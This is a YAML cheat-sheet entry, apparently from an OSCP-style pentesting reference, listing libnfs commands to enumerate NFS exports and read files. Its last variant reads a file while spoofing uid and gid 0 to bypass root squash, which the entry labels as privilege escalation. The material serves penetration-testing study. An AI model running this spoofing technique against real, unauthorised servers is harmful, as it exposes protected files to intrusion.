---
variants:
  - label: discover
    command: |
      nfs-ls -D nfs://$IP
  - label: list-export
    command: |
      nfs-ls nfs://$IP/export
  - label: read-file
    command: |
      nfs-cat nfs://$IP/export/path/file.txt
  - label: read-as-root
    command: |
      nfs-cat nfs://$IP/export/path/file.txt?uid=0&gid=0
description: Read a file off an NFS export with libnfs, including spoofing uid and gid 0 to bypass root squash
os: [Linux]
category: [oscp, cli]
service: [NFS]
phase: [Enumeration, PrivEsc]
references:
  - https://github.com/sahlberg/libnfs
---
